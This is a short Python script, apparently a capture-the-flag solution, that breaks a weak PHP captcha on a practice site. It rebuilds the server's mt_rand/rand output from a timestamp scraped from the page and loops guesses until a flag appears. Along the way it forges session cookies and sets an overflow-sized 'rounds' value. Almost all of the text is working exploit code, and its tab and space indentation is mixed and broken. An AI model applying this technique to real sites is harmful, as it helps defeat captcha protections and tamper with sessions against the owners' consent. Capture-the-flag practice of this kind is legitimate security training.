#This exploited a weak implementation of randomness in PHP. It affected a weak captcha. 

import requests
import subprocess
from time import sleep

def get_rnd(Round, time):
        rnd = subprocess.check_output(['php', '-r', '$rnd = mt_rand(1, {0});srand({1});$rnd &= rand();print_r($rnd);'.format(Round, time)])
        return rnd.decode().strip()

req = requests.get('HOST')

cook = req.cookies
cook.set('rounds', str(9223372036854775808-500), domain='hackers.gg')

while 1:
        cook.set('PHPSESSID', str(1337), domain='hackers.gg')
        cook.set('server-sesion-cookie-id', str(1337), domain='hackers.gg')
        cook.set('session', str(1337), domain='hackers.gg')
        reqtextlist = req.text.split('\n')
        i = 0
        while i <= 8:
        	del reqtextlist[0]
        	i += 1
        imgidnum = ""
        imgid = str(reqtextlist[0])
        for char in imgid:
                if char.isdigit() == True:
                        imgidnum = str(imgidnum) + str(char)
        time = int(imgidnum)
	#print(time)
        Round = cook.get('rounds')
	#print(Round)
	captcha = get_rnd(Round, time)
	#print(captcha)
	req = requests.post('HOST', data={'guess': str(captcha)}, cookies=cook)
	cook = req.cookies
	if 'FLAG' in req.text:
		print(req.text)
		input()
		break
	#sleep(.25)
